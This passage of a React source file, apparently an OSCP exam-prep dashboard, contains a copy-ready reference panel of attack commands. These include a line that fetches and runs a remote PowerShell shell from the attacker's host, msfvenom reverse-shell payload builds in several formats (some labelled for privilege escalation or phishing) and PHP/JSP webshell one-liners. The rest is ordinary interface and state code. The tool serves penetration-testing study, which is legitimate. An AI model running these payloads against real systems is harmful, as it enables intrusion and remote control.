      { id:"wr4", text:"ConPtyShell — full interactive Windows shell", cmd:"IEX(IWR http://KALI/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell KALI 443" },
    ]},
    { title: "🔧 SHELL UPGRADE (immediately after landing)", items: [
      { id:"su1", text:"Python PTY spawn — first step", cmd:"python3 -c 'import pty; pty.spawn(\"/bin/bash\")'" },
      { id:"su2", text:"Background + raw mode + foreground", cmd:"[Ctrl+Z] then: stty raw -echo; fg" },
      { id:"su3", text:"Set terminal type and size", cmd:"export TERM=xterm && stty rows 40 cols 160" },
      { id:"su4", text:"Script method — no python available", cmd:"script -qc /bin/bash /dev/null" },
    ]},
    { title: "⚒️ MSFVENOM PAYLOADS", items: [
      { id:"mv1", text:"Windows x64 EXE — standard rev shell binary", cmd:"msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI LPORT=443 -f exe -o rev64.exe" },
      { id:"mv2", text:"Windows x86 EXE — 32-bit targets", cmd:"msfvenom -p windows/shell_reverse_tcp LHOST=KALI LPORT=443 -f exe -o rev32.exe" },
      { id:"mv3", text:"Linux x64 ELF — standard Linux binary", cmd:"msfvenom -p linux/x64/shell_reverse_tcp LHOST=KALI LPORT=443 -f elf -o rev64.elf" },
      { id:"mv4", text:"PHP reverse shell — for web upload", cmd:"msfvenom -p php/reverse_php LHOST=KALI LPORT=443 -o shell.php" },
      { id:"mv5", text:"ASPX reverse shell — for IIS", cmd:"msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI LPORT=443 -f aspx -o shell.aspx" },
      { id:"mv6", text:"WAR file — for Tomcat /manager deploy", cmd:"msfvenom -p java/jsp_shell_reverse_tcp LHOST=KALI LPORT=443 -f war -o shell.war" },
      { id:"mv7", text:"MSI — for AlwaysInstallElevated privesc", cmd:"msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI LPORT=443 -f msi -o evil.msi" },
      { id:"mv8", text:"DLL — for DLL hijacking privesc", cmd:"msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI LPORT=443 -f dll -o evil.dll" },
      { id:"mv9", text:"HTA — for client-side phishing", cmd:"msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI LPORT=443 -f hta-psh -o evil.hta" },
    ]},
    { title: "🌐 WEB SHELLS", items: [
      { id:"ws1", text:"PHP one-liner webshell", cmd:"<?php system($_GET['cmd']); ?>" },
      { id:"ws2", text:"PHP Pentest Monkey full shell (edit IP/port)", cmd:"cp /usr/share/webshells/php/php-reverse-shell.php shell.php" },
      { id:"ws3", text:"ASP webshell — classic ASP servers", cmd:"cp /usr/share/webshells/asp/cmd.asp ." },
      { id:"ws4", text:"ASPX webshell — .NET/IIS servers", cmd:"cp /usr/share/webshells/aspx/cmdasp.aspx ." },
      { id:"ws5", text:"JSP webshell — Java/Tomcat", cmd:"<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>" },
    ]},
  ];

  return (
    <div style={{borderBottom:"1px solid rgba(68,255,68,0.15)",background:"rgba(0,0,0,0.25)",maxHeight:"70vh",overflowY:"auto"}}>
      <div style={{padding:"8px 14px",display:"flex",justifyContent:"space-between",alignItems:"center",borderBottom:"1px solid rgba(68,255,68,0.08)",position:"sticky",top:0,background:"rgba(10,15,20,0.97)",zIndex:5,flexWrap:"wrap",gap:8}}>
        <span style={{fontSize:12,fontWeight:800,fontFamily:mono,color:"#44ff44",letterSpacing:1}}>🐚 SHELL & PAYLOAD REFERENCE</span>
        <div style={{display:"flex",alignItems:"center",gap:8}}>
          <span style={{fontSize:9,color:"#556677",fontFamily:mono}}>KALI IP:</span>
          <input value={kaliIp} onChange={e=>setKaliIp(e.target.value)} onKeyDown={e=>e.key==="Enter"&&apply()} placeholder="10.10.14.x" style={{width:110,background:"rgba(0,0,0,0.4)",border:`1px solid ${kaliIp!==appliedIp?"rgba(255,170,0,0.4)":"rgba(68,255,68,0.2)"}`,borderRadius:3,color:"#44ff44",fontFamily:mono,fontSize:10,padding:"3px 7px",outline:"none"}}/>
          <span style={{fontSize:9,color:"#556677",fontFamily:mono}}>PORT:</span>
          <input value={kaliPort} onChange={e=>setKaliPort(e.target.value)} onKeyDown={e=>e.key==="Enter"&&apply()} placeholder="443" style={{width:55,background:"rgba(0,0,0,0.4)",border:`1px solid ${kaliPort!==appliedPort?"rgba(255,170,0,0.4)":"rgba(100,130,160,0.15)"}`,borderRadius:3,color:"#88bbdd",fontFamily:mono,fontSize:10,padding:"3px 7px",outline:"none"}}/>
          <button onClick={apply} style={{background:kaliIp!==appliedIp||kaliPort!==appliedPort?"rgba(68,255,68,0.15)":"rgba(68,255,68,0.06)",border:`1px solid ${kaliIp!==appliedIp||kaliPort!==appliedPort?"#44ff44":"rgba(68,255,68,0.15)"}`,color:kaliIp!==appliedIp||kaliPort!==appliedPort?"#44ff44":"#336644",borderRadius:3,padding:"3px 10px",cursor:"pointer",fontSize:9,fontFamily:mono,fontWeight:700}}>APPLY</button>
        </div>
      </div>
      <div style={{display:"grid",gridTemplateColumns:"repeat(auto-fit, minmax(380px, 1fr))",gap:0}}>
        {sections.map(sec=>(
          <div key={sec.title} style={{borderRight:"1px solid rgba(100,130,160,0.06)",borderBottom:"1px solid rgba(100,130,160,0.06)"}}>
            <div style={{padding:"6px 10px",background:"rgba(68,255,68,0.03)",borderBottom:"1px solid rgba(68,255,68,0.06)"}}>
              <span style={{fontSize:10,fontWeight:700,fontFamily:mono,color:"#44ff44"}}>{sec.title}</span>
            </div>
            {sec.items.map(item=>(
              <div key={item.id} style={{display:"flex",alignItems:"flex-start",gap:6,padding:"4px 10px",borderBottom:"1px solid rgba(100,130,160,0.03)"}}>
                <div style={{flex:1,minWidth:0}}>
                  <div style={{fontSize:10.5,fontFamily:mono,color:"#e8edf2",lineHeight:1.4}}>{item.text}</div>
                  <div style={{fontSize:10,fontFamily:mono,color:"#6b7f94",lineHeight:1.4,wordBreak:"break-all"}}>{item.cmd&&sub(item.cmd)}</div>
                </div>
                <button onClick={()=>copy(item.id,item.cmd)} title="Copy" style={{background:copied===item.id?"rgba(68,255,68,0.15)":"none",border:"none",color:copied===item.id?"#44ff44":"#334455",cursor:"pointer",fontSize:10,padding:"2px 4px",fontFamily:mono,flexShrink:0,marginTop:2}}>{copied===item.id?"✓":"📋"}</button>
              </div>
            ))}
          </div>
        ))}
      </div>
    </div>
  );
}

export default function App() {
  const saved = load()||{};
  const [tab,setTab] = useState(saved.tab||"ad");
  const [data,setData] = useState(saved.data||{ad:{},l1:{},l2:{},w1:{},w2:{}});
  const [creds,setCreds] = useState(saved.creds||[{id:"c1",u:"",p:"",src:"",tested:""}]);
  const [showCreds,setShowCreds] = useState(saved.showCreds??true);
  const [showShells,setShowShells] = useState(false);
  const [showPhishing,setShowPhishing] = useState(false);
  const [showCracking,setShowCracking] = useState(false);
  const [showTransfers,setShowTransfers] = useState(false);
  const [showPreCheck,setShowPreCheck] = useState(false);
  const [showReset,setShowReset] = useState(false);
  const [examStart,setExamStart] = useState(saved.examStart||null);
  const [timers,setTimers] = useState(saved.timers||{});
  const [lastSaved,setLastSaved] = useState(null);
  const [theme,setTheme] = useState(saved.theme||"dark");
  const T = THEMES[theme];

  // Auto-save to localStorage
  useEffect(()=>{save({tab,data,creds,showCreds,examStart,timers,theme})},[tab,data,creds,showCreds,examStart,timers,theme]);

  // Manual save → also downloads JSON backup
  const manualSave = () => {
    const state = {tab,data,creds,showCreds,examStart,timers,theme,savedAt:new Date().toISOString()};
    save(state);
    const blob = new Blob([JSON.stringify(state,null,2)],{type:"application/json"});
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url; a.download = `oscp-backup-${new Date().toISOString().slice(0,19).replace(/:/g,"")}.json`;
    a.click(); URL.revokeObjectURL(url);
    setLastSaved(Date.now());
  };

  // Import backup
  const importBackup = () => {
    const input = document.createElement("input");
    input.type = "file"; input.accept = ".json";
    input.onchange = e => {
      const f = e.target.files[0]; if(!f) return;
      const reader = new FileReader();
      reader.onload = ev => {
        try {
          const s = JSON.parse(ev.target.result);
          if(s.data) { setData(s.data); setCreds(s.creds||creds); setExamStart(s.examStart||null); setTimers(s.timers||{}); if(s.tab) setTab(s.tab); }
        } catch {}
      };
      reader.readAsText(f);
    };
    input.click();
  };

  const setD = (k,v) => setData({...data,[k]:v});
  const reset = () => {setData({ad:{},l1:{},l2:{},w1:{},w2:{}});setCreds([{id:"c1",u:"",p:"",src:"",tested:""}]);setTimers({});setExamStart(null);setShowReset(false)};

  // Extract starred items for report
  const getStarred = () => {
    const out = [];
    const extract = (label,obj) => {
      const ch = obj?.checks||{};
      Object.entries(ch).forEach(([k,v])=>{if(v==="starred") out.push({machine:label,item:k,note:obj?.notes?.[k]||""})});
      ["ms01","ms02","dc"].forEach(m=>{
        if(obj?.[m]?.checks) Object.entries(obj[m].checks).forEach(([k,v])=>{if(v==="starred") out.push({machine:`${label}/${m}`,item:k,note:obj[m]?.notes?.[k]||""})});
      });
    };
    extract("AD",data.ad); extract("Linux#1",data.l1); extract("Linux#2",data.l2); extract("Win#1",data.w1); extract("Win#2",data.w2);
    return out;
  };

  const tabs = [
    {k:"ad",l:"🏰 AD",c:"#ff6644"},
    {k:"l1",l:"🐧 Linux #1",c:"#44aaff"},
    {k:"l2",l:"🐧 Linux #2",c:"#44aaff"},
    {k:"w1",l:"🪟 Win #1",c:"#aa66ff"},
    {k:"w2",l:"🪟 Win #2",c:"#aa66ff"},
  ];

  return (
    <div style={{minHeight:"100vh",background:T.bg,fontFamily:mono,color:T.text}}>
      <style>{`@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700;800&display=swap');*{box-sizing:border-box}::selection{background:${T.selection}}::-webkit-scrollbar{width:5px}::-webkit-scrollbar-track{background:${T.scrollTrack}}::-webkit-scrollbar-thumb{background:${T.scrollThumb};border-radius:3px}@keyframes pulse{0%,100%{opacity:1}50%{opacity:.5}}textarea:focus,input:focus{border-color:rgba(68,170,255,0.35)!important}`}</style>

      {/* Header Row 1: Branding + Exam Clock */}
      <div style={{padding:"8px 14px",borderBottom:`1px solid ${T.border}`,display:"flex",justifyContent:"space-between",alignItems:"center",background:T.bgSub}}>
        <div style={{display:"flex",alignItems:"center",gap:12}}>
          <div style={{display:"flex",alignItems:"baseline",gap:6}}>
            <span style={{fontSize:16,fontWeight:800,color:T.green,letterSpacing:2}}>OSCP</span>
            <span style={{fontSize:14,fontWeight:300,color:T.green,opacity:0.7}}>COMMAND CENTER</span>
          </div>
          <PointsTracker data={data} T={T} theme={theme}/>
        </div>
        <div style={{display:"flex",alignItems:"center",gap:8}}>
          <button onClick={()=>setTheme(theme==="dark"?"hacker":theme==="hacker"?"light":"dark")} style={{background:"none",border:`1px solid ${T.borderMid}`,color:T.textDim,borderRadius:3,padding:"2px 8px",cursor:"pointer",fontSize:10,fontFamily:mono}} title="Toggle theme">{theme==="dark"?"💀":theme==="hacker"?"☀":"🌙"}</button>
          <ExamClock startedAt={examStart} onStart={()=>setExamStart(Date.now())}/>
        </div>
      </div>

      {/* Header Row 2: Actions */}
      <div style={{padding:"4px 14px",borderBottom:"1px solid rgba(100,130,160,0.06)",display:"flex",justifyContent:"space-between",alignItems:"center",background:"rgba(0,0,0,0.2)",flexWrap:"wrap",gap:4}}>
        <div style={{display:"flex",gap:4,alignItems:"center"}}>
          <button onClick={()=>setShowCreds(!showCreds)} style={{background:showCreds?"rgba(255,170,0,0.1)":"rgba(100,130,160,0.06)",border:`1px solid ${showCreds?"rgba(255,170,0,0.25)":"rgba(100,130,160,0.1)"}`,color:showCreds?"#ffaa00":"#556677",borderRadius:3,padding:"3px 9px",cursor:"pointer",fontSize:9,fontFamily:mono}}>🔑 CREDS</button>
          <button onClick={()=>setShowShells(!showShells)} style={{background:showShells?"rgba(68,255,68,0.1)":"rgba(100,130,160,0.06)",border:`1px solid ${showShells?"rgba(68,255,68,0.25)":"rgba(100,130,160,0.1)"}`,color:showShells?"#44ff44":"#556677",borderRadius:3,padding:"3px 9px",cursor:"pointer",fontSize:9,fontFamily:mono}}>🐚 SHELLS</button>
          <button onClick={()=>setShowPhishing(!showPhishing)} style={{background:showPhishing?"rgba(255,100,100,0.1)":"rgba(100,130,160,0.06)",border:`1px solid ${showPhishing?"rgba(255,100,100,0.25)":"rgba(100,130,160,0.1)"}`,color:showPhishing?"#ff6666":"#556677",borderRadius:3,padding:"3px 9px",cursor:"pointer",fontSize:9,fontFamily:mono}}>🎣 PHISHING</button>
          <button onClick={()=>setShowCracking(!showCracking)} style={{background:showCracking?"rgba(255,170,0,0.1)":"rgba(100,130,160,0.06)",border:`1px solid ${showCracking?"rgba(255,170,0,0.25)":"rgba(100,130,160,0.1)"}`,color:showCracking?"#ffaa00":"#556677",borderRadius:3,padding:"3px 9px",cursor:"pointer",fontSize:9,fontFamily:mono}}>🔓 CRACKING</button>
          <button onClick={()=>setShowTransfers(!showTransfers)} style={{background:showTransfers?"rgba(68,170,255,0.1)":"rgba(100,130,160,0.06)",border:`1px solid ${showTransfers?"rgba(68,170,255,0.25)":"rgba(100,130,160,0.1)"}`,color:showTransfers?"#44aaff":"#556677",borderRadius:3,padding:"3px 9px",cursor:"pointer",fontSize:9,fontFamily:mono}}>📦 TRANSFERS</button>
          <button onClick={()=>setShowPreCheck(!showPreCheck)} style={{background:showPreCheck?"rgba(170,130,255,0.1)":"rgba(100,130,160,0.06)",border:`1px solid ${showPreCheck?"rgba(170,130,255,0.25)":"rgba(100,130,160,0.1)"}`,color:showPreCheck?"#aa88ff":"#556677",borderRadius:3,padding:"3px 9px",cursor:"pointer",fontSize:9,fontFamily:mono}}>🛡️ PRE-CHECK</button>
          <button onClick={()=>{const s=getStarred();const t=s.map(x=>`[${x.machine}] ${x.item}${x.note?" — "+x.note:""}`).join("\n");navigator.clipboard.writeText(t).catch(()=>{})}} style={{background:"rgba(255,170,0,0.06)",border:"1px solid rgba(255,170,0,0.15)",color:"#887733",borderRadius:3,padding:"3px 9px",cursor:"pointer",fontSize:9,fontFamily:mono}} title="Copy starred items for report">★ EXPORT</button>
        </div>
        <div style={{display:"flex",gap:4,alignItems:"center"}}>
          <button onClick={manualSave} style={{background:"rgba(68,170,255,0.08)",border:"1px solid rgba(68,170,255,0.2)",color:"#4488bb",borderRadius:3,padding:"3px 9px",cursor:"pointer",fontSize:9,fontFamily:mono,fontWeight:700}}>💾 SAVE BACKUP</button>
          <button onClick={importBackup} style={{background:"rgba(100,130,160,0.06)",border:"1px solid rgba(100,130,160,0.1)",color:"#556677",borderRadius:3,padding:"3px 9px",cursor:"pointer",fontSize:9,fontFamily:mono}}>📂 IMPORT</button>
          {lastSaved&&<span style={{fontSize:8,color:"#44ff44",fontFamily:mono}}>✓ saved</span>}
          {!showReset?<button onClick={()=>setShowReset(true)} style={{background:"rgba(255,68,68,0.06)",border:"1px solid rgba(255,68,68,0.1)",color:"#663333",borderRadius:3,padding:"3px 9px",cursor:"pointer",fontSize:9,fontFamily:mono}}>RESET</button>
          :<div style={{display:"flex",gap:3}}><button onClick={reset} style={{background:"rgba(255,68,68,0.15)",border:"1px solid #ff4444",color:"#ff4444",borderRadius:3,padding:"3px 9px",cursor:"pointer",fontSize:9,fontFamily:mono,fontWeight:700}}>CONFIRM</button><button onClick={()=>setShowReset(false)} style={{background:"none",border:"none",color:"#556677",cursor:"pointer",fontSize:11}}>✗</button></div>}
        </div>
      </div>

      {showCreds&&<div style={{borderBottom:"1px solid rgba(255,170,0,0.1)",background:"rgba(255,170,0,0.01)"}}><CredMatrix creds={creds} setCreds={setCreds}/></div>}
      {showShells&&<ShellsPanel/>}
      {showPhishing&&<PhishingPanel/>}
      {showCracking&&<CrackingPanel/>}
      {showTransfers&&<TransfersPanel/>}
      {showPreCheck&&<PreEngagementPanel/>}

      {/* Tabs */}
      <div style={{display:"flex",borderBottom:"1px solid rgba(100,130,160,0.08)",background:"rgba(0,0,0,0.15)",overflowX:"auto"}}>
        {tabs.map(t=>{
          const d = data[t.k]||{};
          const ip = t.k==="ad"?(d.ms01?.ip||""):(d.ip||"");
          const done = d.completed;
          return <button key={t.k} onClick={()=>setTab(t.k)} style={{background:tab===t.k?"rgba(100,130,160,0.06)":"transparent",border:"none",borderBottom:tab===t.k?`2px solid ${done?"#44ff44":t.c}`:"2px solid transparent",color:tab===t.k?(done?"#44ff44":t.c):"#445566",padding:"7px 12px",cursor:"pointer",fontSize:10,fontFamily:mono,fontWeight:tab===t.k?700:400,whiteSpace:"nowrap"}}>
            {done?"🏆 ":""}{t.l}{ip&&<span style={{marginLeft:4,fontSize:8,opacity:0.6}}>{ip}</span>}
          </button>;
        })}
      </div>

      {/* Content */}
      {tab==="ad"?<ADTab state={data.ad||{}} setState={v=>setD("ad",v)} creds={creds} timers={timers} setTimers={setTimers}/>:
        <StandaloneTab mk={tab} state={data[tab]||{}} setState={v=>setD(tab,v)} creds={creds} timers={timers} setTimers={setTimers}/>}

      <div style={{padding:"12px 10px",textAlign:"center",borderTop:`1px solid ${T.border}`,background:T.bgSub}}>
        <div style={{fontSize:9,color:T.textDim,fontFamily:mono,marginBottom:2}}>☆ checked · ★ attack path · 📋 copy command · 💾 JSON backup · 💀/☀/🌙 theme</div>
        <div style={{fontSize:10,color:T.textFaint,fontFamily:mono}}>
          <span style={{fontWeight:700,color:T.green}}>OSCP Command Center</span>
          <span style={{margin:"0 6px"}}>·</span>
          <a href="https://github.com/whisk3y3" target="_blank" rel="noopener noreferrer" style={{color:T.green,textDecoration:"none"}}>@whisk3y3</a>
          <span style={{margin:"0 6px"}}>·</span>
          <span>MIT License</span>
        </div>
      </div>
    </div>
  );
}
